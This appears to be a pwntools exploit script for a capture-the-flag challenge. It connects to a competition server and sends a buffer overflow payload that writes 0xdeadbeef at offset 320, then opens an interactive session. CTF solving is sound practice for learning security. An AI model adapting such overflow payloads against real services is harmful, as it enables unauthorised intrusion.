from pwn import *

io = remote('chal.pctf.competitivecyber.club', 9999)

payload = fit({
    320: 0xdeadbeef
})

io.recvuntil('guess: ')
io.sendline(payload)
io.interactive()

